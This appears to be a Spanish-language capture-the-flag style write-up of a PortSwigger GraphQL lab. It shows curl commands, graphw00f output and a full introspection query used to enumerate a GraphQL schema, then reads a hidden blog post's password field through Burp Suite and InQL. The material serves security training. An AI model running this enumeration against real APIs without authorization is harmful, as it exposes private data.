---
title: GraphQL API Vulnerabilities Lab 1
date: 2025-02-26 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - GraphQL API Vulnerabilities
tags:
  - GraphQL API Vulnerabilities
  - Accessing private GraphQL posts
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Skills

- Accessing private GraphQL posts

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

La página del `blog` para este `laboratorio` contiene una `entrada oculta` que tiene una `contraseña secreta`. Para `resolver` el `laboratorio`, debemos `encontrar` la `entrada oculta` del `blog` e `introducir` la `contraseña`

---

## Resolución

Al `acceder` a la `web` vemos esto

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-1/image_1.png)

Los `servicios GraphQL` suelen utilizar `endpoints` similares a estos. En `Hacktricks` [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html#graphql](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html#graphql) se nos explica paso por paso la forma en la que debemos `enumerar` este `servicio`

```
/graphql  
/api  
/apigraphql  
/graphqlapi  
/graphqlgraphql
```

Si los `endpoints` anteriores `no devuelven respuesta` podemos añadirles `/v1`

```
/graphql/v1  
/api/v1  
/apigraphql/v1  
/graphqlapi/v1  
/graphqlgraphql/v1
```

Si hacemos una `petición` a un `endpoint inexistente` obtenemos esta `respuesta`

```
# curl https://0af40067035241d4829e65a9002f00a0.web-security-academy.net/test
"Not Found" 
```

Sin embargo, si hacemos una `consulta` a un `endpoint` que si que `exista` recibiremos un mensaje como `"query not present"` o similar

```
# curl -X POST https://0af40067035241d4829e65a9002f00a0.web-security-academy.net/graphql/v1 -H "Content-Type: application/json" -d "{}"
"Query not present"
```

Para comprobar que se trata de `GraphQL` podemos usar `universal queries`, si el `content-type` es `x-www-form-urlencoded` podemos usar este payload `query{__typename}` y si el `content-type` es `application/json`, debemos `adaptar` el `payload` a este otro `{"query":"{__typename}"}`. Cuando `enviemos` estos `payloads` se nos devolverá `{"data": {"__typename": "query"}}` en alguna parte de la `respuesta`. La consulta funciona porque cada `endpoint` de `GraphQL` tiene un `campo reservado` llamado `__typename` que `devuelve` el `tipo` del `objeto consultado` como una `cadena`

```
# curl -X POST https://0af40067035241d4829e65a9002f00a0.web-security-academy.net/graphql/v1 -H "Content-Type: application/json" -d '{"query":"{__typename}"}'    
{
  "data": {
    "__typename": "query"
  }
}                                                       
```

En la mayoría de casos los `endpoints` en `GraphQL` solo aceptan `peticiones POST` con `content-type` de `application/json` porque esto ayuda a `proteger` contra `vulnerabilidades` de `CSRF`. Sin embargo, hay ocasiones en las que también acepta otros métodos, para comprobar esto deberíamos `bruteforcear` los `endpoints` para `obtener` que `métodos` son `válidos`. Puede darse el caso en el que acepte un `content-type` de `x-www-form-urlencoded`. La forma más sencilla de `encontrar endpoints` es `observar` las `peticiones`. Si `recargamos` la `página` y `capturamos` la `petición` vemos que se está empleando `GraphQL`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-1/image_2.png)

Si hacemos click sobre `View Post` y `capturamos` la `petición` también vemos que también se emplea `GraphQL`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-1/image_3.png)

Una vez tenemos la ruta principal `/graphql/v1` podemos usar la herramienta `graphw00f` [https://github.com/dolevf/graphw00f.git](https://github.com/dolevf/graphw00f.git) para `enumerar` el `servidor` o `motor` que `gestiona` y `procesa` las `consultas` de `GraphQL`. Con esta herramienta también podemos hacer `fuerza bruta` para `identificar` la `ruta principal` de `GraphQL`

```
# python main.py -f -t https://0af40067035241d4829e65a9002f00a0.web-security-academy.net/graphql/v1

                +-------------------+
                |     graphw00f     |
                +-------------------+
                  ***            ***
                **                  **
              **                      **
    +--------------+              +--------------+
    |    Node X    |              |    Node Y    |
    +--------------+              +--------------+
                  ***            ***
                     **        **
                       **    **
                    +------------+
                    |   Node Z   |
                    +------------+

                graphw00f - v1.1.19
          The fingerprinting tool for GraphQL
           Dolev Farhi <dolev@lethalbit.com>
  
[*] Checking if GraphQL is available at https://0af40067035241d4829e65a9002f00a0.web-security-academy.net/graphql/v1...
[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (AWS AppSync)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/appsync.md
[!] Technologies: 
[!] Homepage: https://aws.amazon.com/appsync
[*] Completed.
```

Para `enumerar información` acerca del `esquema` vamos a usar la `introspección`. La `introspección` es una `función integrada` de `GraphQL` que permite `consultar` un `servidor` para `obtener información` sobre su `esquema`. La `introspección` nos ayuda a comprender cómo podemos `interactuar` con una `API GraphQL`. También puede `revelar datos potencialmente confidenciales`, como `campos` de `descripción`. Para saber si la `introspección` está `habilitada` podemos usamos esta `query`

```
# curl -s -X POST https://0aec00ce043258518801ff08004300de.web-security-academy.net/graphql/v1 -H "Content-Type: application/json" -d '{"query":"{__schema{queryType{name}}}"}' | jq  
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      }
    }
  }
}
```

Mediante esta `query` podemos `extraer` todos los `tipos`, sus `campos`, sus `argumentos` y el `tipo` de los `argumentos`

```
# curl -s -X POST https://0aee00a2035e51b583d7482b001d00d2.web-security-academy.net/graphql/v1 -H "Content-Type: application/json" -d '{"query":"{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name,kind}}}}}}}"}' | jq 

{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "BlogPost",
          "fields": [
            {
              "name": "id",
              "args": []
            },
            {
              "name": "image",
              "args": []
            },
            {
              "name": "title",
              "args": []
            },
            {
              "name": "author",
              "args": []
            },
            {
              "name": "date",
              "args": []
            },
            {
              "name": "summary",
              "args": []
            },
            {
              "name": "paragraphs",
              "args": []
            },
            {
              "name": "isPrivate",
              "args": []
            },
            {
              "name": "postPassword",
              "args": []
            }
          ]
        },
        {
          "name": "Boolean",
          "fields": null
        },
        {
          "name": "Int",
          "fields": null
        },
        {
          "name": "String",
          "fields": null
        },
        {
          "name": "Timestamp",
          "fields": null
        },
        {
          "name": "__Directive",
          "fields": [
            {
              "name": "name",
              "args": []
            },
            {
              "name": "description",
              "args": []
            },
            {
              "name": "isRepeatable",
              "args": []
            },
            {
              "name": "locations",
              "args": []
            },
            {
              "name": "args",
              "args": [
                {
                  "name": "includeDeprecated",
                  "description": null,
                  "type": {
                    "name": "Boolean",
                    "kind": "SCALAR",
                    "ofType": null
                  }
                }
              ]
            }
          ]
        },
        {
          "name": "__DirectiveLocation",
          "fields": null
        },
        {
          "name": "__EnumValue",
          "fields": [
            {
              "name": "name",
              "args": []
            },
            {
              "name": "description",
              "args": []
            },
            {
              "name": "isDeprecated",
              "args": []
            },
            {
              "name": "deprecationReason",
              "args": []
            }
          ]
        },
        {
          "name": "__Field",
          "fields": [
            {
              "name": "name",
              "args": []
            },
            {
              "name": "description",
              "args": []
            },
            {
              "name": "args",
              "args": [
                {
                  "name": "includeDeprecated",
                  "description": null,
                  "type": {
                    "name": "Boolean",
                    "kind": "SCALAR",
                    "ofType": null
                  }
                }
              ]
            },
            {
              "name": "type",
              "args": []
            },
            {
              "name": "isDeprecated",
              "args": []
            },
            {
              "name": "deprecationReason",
              "args": []
            }
          ]
        },
        {
          "name": "__InputValue",
          "fields": [
            {
              "name": "name",
              "args": []
            },
            {
              "name": "description",
              "args": []
            },
            {
              "name": "type",
              "args": []
            },
            {
              "name": "defaultValue",
              "args": []
            },
            {
              "name": "isDeprecated",
              "args": []
            },
            {
              "name": "deprecationReason",
              "args": []
            }
          ]
        },
        {
          "name": "__Schema",
          "fields": [
            {
              "name": "description",
              "args": []
            },
            {
              "name": "types",
              "args": []
            },
            {
              "name": "queryType",
              "args": []
            },
            {
              "name": "mutationType",
              "args": []
            },
            {
              "name": "directives",
              "args": []
            },
            {
              "name": "subscriptionType",
              "args": []
            }
          ]
        },
        {
          "name": "__Type",
          "fields": [
            {
              "name": "kind",
              "args": []
            },
            {
              "name": "name",
              "args": []
            },
            {
              "name": "description",
              "args": []
            },
            {
              "name": "fields",
              "args": [
                {
                  "name": "includeDeprecated",
                  "description": null,
                  "type": {
                    "name": "Boolean",
                    "kind": "SCALAR",
                    "ofType": null
                  }
                }
              ]
            },
            {
              "name": "interfaces",
              "args": []
            },
            {
              "name": "possibleTypes",
              "args": []
            },
            {
              "name": "enumValues",
              "args": [
                {
                  "name": "includeDeprecated",
                  "description": null,
                  "type": {
                    "name": "Boolean",
                    "kind": "SCALAR",
                    "ofType": null
                  }
                }
              ]
            },
            {
              "name": "inputFields",
              "args": [
                {
                  "name": "includeDeprecated",
                  "description": null,
                  "type": {
                    "name": "Boolean",
                    "kind": "SCALAR",
                    "ofType": null
                  }
                }
              ]
            },
            {
              "name": "ofType",
              "args": []
            },
            {
              "name": "specifiedByURL",
              "args": []
            }
          ]
        },
        {
          "name": "__TypeKind",
          "fields": null
        },
        {
          "name": "query",
          "fields": [
            {
              "name": "getBlogPost",
              "args": [
                {
                  "name": "id",
                  "description": null,
                  "type": {
                    "name": null,
                    "kind": "NON_NULL",
                    "ofType": {
                      "name": "Int",
                      "kind": "SCALAR"
                    }
                  }
                }
              ]
            },
            {
              "name": "getAllBlogPosts",
              "args": []
            }
          ]
        }
      ]
    }
  }
}
```

Es interesante saber si se van a `mostrar errores`, ya que `aportan información útil`

```
# curl -s -X POST https://0aee00a2035e51b583d7482b001d00d2.web-security-academy.net/graphql/v1 -H "Content-Type: application/json" -d '{"query":"{__schema}"}' | jq                                                                                   
{
  "errors": [
    {
      "extensions": {},
      "locations": [
        {
          "line": 1,
          "column": 2
        }
      ],
      "message": "Validation error (SubselectionRequired@[__schema]) : Subselection required for type '__Schema!' of field '__schema'"
    }
  ]
}
```

```
# curl -s -X POST https://0aee00a2035e51b583d7482b001d00d2.web-security-academy.net/graphql/v1 -H "Content-Type: application/json" -d '{"query":"{}"}' | jq        

{
  "errors": [
    {
      "locations": [
        {
          "line": 1,
          "column": 2
        }
      ],
      "message": "Invalid syntax with offending token '}' at line 1 column 2"
    }
  ]
}
```

```
# curl -s -X POST https://0aee00a2035e51b583d7482b001d00d2.web-security-academy.net/graphql/v1 -H "Content-Type: application/json" -d '{"query":"{thisdefinitelydoesnotexist}"}' | jq

{
  "errors": [
    {
      "extensions": {},
      "locations": [
        {
          "line": 1,
          "column": 2
        }
      ],
      "message": "Validation error (FieldUndefined@[thisdefinitelydoesnotexist]) : Field 'thisdefinitelydoesnotexist' in type 'query' is undefined"
    }
  ]
}
```

Podemos obtener aún más `información` realizando una `consulta` de `introspección completa` sobre el `endpoint`, esto se hace para poder `obtener` la `mayor cantidad` de `información posible` del `esquema`. Este `consulta devuelve detalles completos sobre todas las consultas, mutaciones, suscripciones, tipos y fragmentos`. Si la `introspección` está `habilitada` pero la `consulta no se ejecuta`, debemos `eliminar` las directivas `onOperation`, `onFragment` y `onField` de la `estructura` de la `consulta`, esto se debe a que `muchos endpoints no aceptan estas directivas como parte de una consulta de introspección`

```
#Full introspection query

query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
        }
        onOperation  #Often needs to be deleted to run query
        onFragment   #Often needs to be deleted to run query
        onField      #Often needs to be deleted to run query
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

Para `realizar` la `query anterior` debemos `refrescar` la `página`, `capturar` la `petición` con `Burpsuite`, `borrar` estas `tres líneas` porque `provocan` un `error`, `pinchar` sobre la `pestaña GraphQL` y `pegar` ahí el `código`

```
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
```

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-1/image_4.png)

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-1/image_5.png)

Podemos `copiar` las `respuestas` de las `queries` en `graphql-visualizer` [http://nathanrandal.com/graphql-visualizer/](http://nathanrandal.com/graphql-visualizer/) o en `graphql-voyager` [https://graphql-kit.com/graphql-voyager/](https://graphql-kit.com/graphql-voyager/) para `ver` los `resultados obtenidos` de forma `gráfica`. En el caso de `graphql-voyager` debemos usar el `payload` que hay en la `web`. Los campos `isPrivate` y `postPassword` son `interesantes`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-1/image_6.png)

`Recargamos` la `página principal`, `capturamos` la `petición`, nos dirigimos a la pestaña de `GraphQL` y añadimos los campos `isPrivate` y `postPassword`. Al `enviar` la `petición` nos damos cuenta que solo que falta el `post` con `id=3`, por lo tanto esto puede indicar que está `oculto`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-1/image_7.png)

Para `listar` el `artículo oculto` pinchamos sobre `View Post`, `capturamos` la `petición`, nos dirigimos a la pestaña de `GraphQL` y añadimos los campos `isPrivate` y `postPassword`. `Obtenemos` la `contraseña` que estaba `oculta` en el `post`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-1/image_8.png)

Pulsamos en `Submit solution` e `introducimos` la `contraseña`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-1/image_9.png)

También podemos llevar a cabo todo este proceso de forma `automatizada` con la `extensión` de `Burpsuite InQL`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-1/image_10.png)

El primer paso es `capturar` una `petición`, pulsar `click derecho` y `Generate queries with InQL Scanner`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-1/image_11.png)

Esto nos `enviará` a esta otra `pestaña` donde debemos pulsar `Analyze`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-1/image_12.png)

Una vez hecho esto `obtendremos` el `esquema` en `JSON` y las `queries`. Podemos `copiar` el `contenido` del `JSON` en [https://graphql-kit.com/graphql-voyager/](https://graphql-kit.com/graphql-voyager/) para poder `visualizar` mejor los `datos` o podemos directamente hacer las `queries` nosotros mismos. Desde `consola` podemos usar `InQL` [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html) o `GQLSpection` [https://github.com/doyensec/GQLSpection.git](https://github.com/doyensec/GQLSpection.git), la herramienta `GQLSpection` es la `sucesora` de `InQL`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-1/image_13.png)
